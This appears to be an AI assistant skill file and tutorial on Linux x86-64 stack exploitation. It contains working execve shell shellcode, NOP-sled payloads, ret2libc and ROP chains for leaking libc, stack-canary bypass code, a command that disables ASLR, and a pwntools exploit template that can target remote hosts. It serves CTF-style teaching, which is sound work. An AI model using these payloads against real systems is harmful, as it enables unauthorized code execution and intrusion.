---
name: stack-smashing
description: >
  Expert guide for classic and modern stack-based binary exploitation on Linux x86-64.
  Use this skill whenever the user wants to: write or debug a buffer overflow exploit,
  craft shellcode, build a NOP sled, control RIP/EIP, bypass stack protections (NX, ASLR,
  SSP/stack canaries, PIE, RELRO), perform ret2libc or ROP chain attacks, analyze a
  vulnerable C program, or understand memory layout (stack, heap, text, BSS). Also trigger
  for questions like "how do I overflow a buffer", "how do I bypass ASLR", "explain NX bit",
  "how do I write a ROP chain", "smash the stack", "get a shell from a vuln binary", or
  any task involving GDB exploit development, pwntools, pwndbg, or similar workflows.
  Even for broad questions like "how does stack exploitation work" — use this skill.
---

# Stack Smashing — Binary Exploitation on Linux x86-64

A practical skill for developing, explaining, and debugging stack-based exploits.
Covers the classic technique through modern mitigations and their bypasses.

---

## Mental Model: Memory Layout

```
High addresses
┌─────────────────────────────┐
│  Stack  (grows downward ↓)  │  local vars, saved RBP, saved RIP, args
├─────────────────────────────┤
│         ...                 │
├─────────────────────────────┤
│  Heap   (grows upward ↑)    │  malloc/calloc/new
├─────────────────────────────┤
│  BSS    (uninit globals)    │
├─────────────────────────────┤
│  Data   (init globals)      │
├─────────────────────────────┤
│  Text   (executable code)   │
└─────────────────────────────┘
Low addresses
```

A stack frame for `foo(a, b)` calling `bar()` looks like:

```
│  arg2              │ ← pushed by caller (or in register: RDX)
│  arg1              │ ← pushed by caller (or in register: RSI, RDI)
│  saved RIP         │ ← return address pushed by CALL
│  saved RBP         │ ← push %rbp  (frame pointer)
│  local buffer[N]   │ ← rsp points here
```

**The overflow primitive:** an unbounded copy (strcpy, gets, read without length check)
into a stack buffer can overwrite saved RBP → saved RIP → caller's frame.
Controlling saved RIP = controlling execution.

---

## Exploitation Stages

### Stage 1 — Find the offset to RIP

Compile the target (debug, no mitigations first):

```bash
gcc -g -O0 -fno-pie -no-pie -fno-stack-protector -z execstack vuln.c -o vuln
```

Use a cyclic pattern to find the exact offset:

```python
# pwntools
from pwn import *
io = process('./vuln')
io.sendline(cyclic(600))
io.wait()
core = io.corefile
offset = cyclic_find(core.read(core.rsp, 4))   # x86-64: check rsp or look at rip
print(f"Offset to RIP: {offset}")
```

Or manually in GDB:

```
$ gdb vuln
(gdb) run $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*524)')
(gdb) info reg rip rsp rbp
```

Increase by 8 until you see `0x4141414141414141` in RIP.

### Stage 2 — Classic Shellcode + NOP Sled (no mitigations)

The NOP sled gives landing tolerance. RIP should point somewhere into the sled.

```
payload = b"\x90" * sled_size + shellcode + retaddr * repeats
total   = offset_to_rip + 8 bytes (overwrite saved RIP)
```

**x86-64 execve("/bin/sh") shellcode (22 bytes):**

```python
shellcode = (
    b"\x48\x31\xf6"         # xor    rsi, rsi
    b"\x56"                 # push   rsi
    b"\x48\xbf/bin//sh"    # movabs rdi, 0x68732f2f6e69622f
    b"\x57"                 # push   rdi
    b"\x54"                 # push   rsp
    b"\x5f"                 # pop    rdi
    b"\xb0\x3b"             # mov    al,  0x3b  (execve syscall)
    b"\x99"                 # cltd   (zero rdx)
    b"\x0f\x05"             # syscall
)
```

**Alignment note:** on x86-64 the return address must be 8-byte aligned.
If the sled lands but syscall crashes, try `offset ± 1..7`.

### Stage 3 — Finding the return address

Inside GDB the stack is at a fixed address (ASLR disabled there by default).
Outside GDB it shifts slightly due to environment variables.

```gdb
(gdb) x/20x $rsp          # view stack, find NOP sled
(gdb) info proc mappings   # confirm stack range
```

Pick a target address in the middle of the visible NOP region. Encode as little-endian:

```python
ret = p64(0x7fffffffdead)   # pwntools
# or manually:
ret = b"\xad\xde\xff\xff\xff\x7f\x00\x00"
```

---

## Mitigations and Bypasses

### NX / W^X (No Execute bit on stack)

**What it does:** marks stack pages non-executable; shellcode segfaults.

**Detect:**

```bash
checksec --file=vuln
# NX: enabled
```

**Bypass — ret2libc:**

```python
# Find system() and "/bin/sh" in libc
system   = elf.libc.symbols['system']
bin_sh   = next(libc.search(b'/bin/sh'))
pop_rdi  = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]   # stack alignment

payload = flat(
    b'A' * offset,
    ret_gadget,   # align RSP to 16 bytes (required for system())
    pop_rdi,
    bin_sh,
    system,
)
```

**Bypass — ROP chain:** see [ROP section](#rop-return-oriented-programming) below.

---

### Stack Canary / SSP

**What it does:** places a random 8-byte value between locals and saved RIP;
checked before returning; mismatch → `__stack_chk_fail` → abort.

**Detect:**

```bash
checksec --file=vuln
# Stack: Canary found
```

**Bypasses:**
- **Leak the canary** via a format string bug or out-of-bounds read, then include it in the overflow.
- **Overwrite `__stack_chk_fail` GOT entry** (requires no RELRO).
- **Heap overflow or off-by-one** that doesn't touch the canary.

Canary layout (x86-64):

```
│ buffer[N]    │
│ canary       │  ← rbp - 8; always ends in \x00 (null byte)
│ saved RBP    │
│ saved RIP    │
```

Leaking + reusing:

```python
# If printf/puts leaks stack memory:
canary = u64(leaked_bytes[offset:offset+8])
payload = flat(b'A'*buf_size, canary, b'B'*8, ret_addr)
```

---

### ASLR

**What it does:** randomizes base addresses of stack, heap, and libraries each run.

**Detect:**

```bash
cat /proc/sys/kernel/randomize_va_space   # 2 = full ASLR
```

**Disable for testing only:**

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

**Bypasses:**
- **Leak a pointer** (format string, UAF, partial overwrite) to de-randomize a region.
- **Brute force** (only practical on 32-bit; 32-bit stack has ~16 bits of entropy).
- **ret2plt / ret2libc with leak**: call `puts(puts@got)` to leak libc base, then compute `system`.
- **Partial overwrite**: overwrite only the lower 12 bits of a saved pointer (fixed page offset).

---

### PIE (Position Independent Executable)

**What it does:** randomizes the executable's own load address (text, GOT, PLT).

**Bypass:** same as ASLR — leak any code pointer (e.g., saved RIP on stack) to compute the base:

```python
exe_base = leaked_rip - elf.symbols['main']   # or any known offset
```

---

### RELRO (Relocation Read-Only)

| Level | Effect |
|-------|--------|
| Partial | GOT writable after startup |
| Full | GOT mapped read-only; can't overwrite function pointers there |

Full RELRO forces ROP / other code-reuse techniques instead of GOT overwrite.

---

## ROP (Return-Oriented Programming)

When NX is on and you can't inject shellcode, chain existing code "gadgets" ending in `ret`.

```bash
ROPgadget --binary vuln --rop      # find gadgets
ropper --file vuln                 # alternative
```

Typical x86-64 calling convention (first 6 args: RDI, RSI, RDX, RCX, R8, R9):

```python
from pwn import *

elf  = ELF('./vuln')
libc = ELF('./libc.so.6')
rop  = ROP(elf)

# Step 1: leak libc via puts(puts@got)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
payload1 = flat(
    b'A' * offset,
    pop_rdi, elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main'],    # return to main for stage 2
)

# Step 2: compute libc base, build system("/bin/sh")
leaked = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']

pop_rdi  = libc.address + next(libc.search(asm('pop rdi; ret')))
ret      = libc.address + next(libc.search(asm('ret')))
system   = libc.symbols['system']
bin_sh   = next(libc.search(b'/bin/sh\x00'))

payload2 = flat(b'A'*offset, ret, pop_rdi, bin_sh, system)
```

**Stack alignment:** `system()` uses SSE instructions; RSP must be 16-byte aligned at call.
Insert a bare `ret` gadget before the call if you get a SIGSEGV inside libc.

---

## GDB / pwndbg Cheatsheet

```gdb
# Attach and examine
gdb -q ./vuln
gef / pwndbg / peda     # enhanced frontends (install one)

run $(python3 -c 'print("A"*600)')
info reg                 # all registers
x/20gx $rsp             # 20 qwords from stack pointer
x/10i $rip              # disassemble at rip
backtrace               # call stack
info proc mappings      # memory map (find stack, libc base)

# Breakpoints
b *0x401234             # break at address
b main
watch *0x7fffffffdead   # watchpoint

# checksec equivalent inside GDB (pwndbg)
checksec
```

---

## Toolchain Reference

| Tool | Purpose |
|------|---------|
| `gcc -z execstack -fno-stack-protector -fno-pie -no-pie` | Disable protections for learning |
| `checksec --file=X` | Audit binary mitigations |
| `pwntools` | Python exploit framework (sockets, ELF, ROP, packing) |
| `pwndbg` / `gef` / `peda` | GDB enhancement plugins |
| `ROPgadget` / `ropper` | Find ROP gadgets |
| `nasm` | Assemble custom shellcode |
| `objdump -d` | Disassemble; extract shellcode bytes |
| `ltrace` / `strace` | Trace library / syscall activity |
| `one_gadget` | Find magic one-shot execve gadgets in libc |

**Extract shellcode bytes from compiled object:**

```bash
nasm -f elf64 -o sc.o shellcode.asm
ld -o sc sc.o
objdump -d sc | grep '^ ' | cut -f2 | tr -d ' \n' | sed 's/../\\x&/g'
```

---

## Common Pitfalls

| Symptom | Likely Cause |
|---------|-------------|
| Segfault even with correct RIP | NX enabled; shellcode can't execute |
| Works in GDB, fails outside | ASLR active outside GDB; addresses differ |
| `system()` crashes with SIGSEGV | RSP not 16-byte aligned; add `ret` gadget |
| Canary mismatch / abort | SSP active; canary must be preserved or leaked |
| Offset is wrong by 1–7 bytes | Alignment issue; try ± small adjustments |
| Null byte in address truncates payload | Use strcpy alternative or find null-free address |

---

## Environment Setup

```bash
# Dependencies
sudo apt-get install gcc gdb nasm binutils python3-pip patchelf

# Python exploit toolkit
pip3 install pwntools

# GDB plugin (pwndbg recommended)
git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh

# checksec
pip3 install checksec.py
# or: apt install checksec

# ROPgadget
pip3 install ropgadget
```

---

## Quick Exploit Template (pwntools)

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
context.arch    = 'amd64'
context.os      = 'linux'
context.log_level = 'info'

elf  = ELF('./vuln', checksec=False)
libc = ELF('./libc.so.6', checksec=False)   # provide matching libc

LOCAL = True
if LOCAL:
    io = process('./vuln')
else:
    io = remote('host', 1337)

# ----- Stage 1: overflow -----
offset = 264   # offset to saved RIP; find with cyclic()

shellcode = asm(shellcraft.sh())   # or hardcoded bytes
nop_sled  = b"\x90" * (offset - len(shellcode))
ret_addr  = p64(0x7fffffffdead)    # replace with leaked / known address

payload = nop_sled + shellcode + ret_addr
io.sendline(payload)
io.interactive()
```

---

## References

- Aleph One, "Smashing the Stack for Fun and Profit" — Phrack #49 (1996)
- https://en.wikipedia.org/NOP_slide
- https://en.wikipedia.org/wiki/Address_space_layout_randomization
- https://docs.pwntools.com
- https://github.com/pwndbg/pwndbg
- https://ropemporium.com — ROP practice challenges
- https://pwn.college — structured binary exploitation curriculum
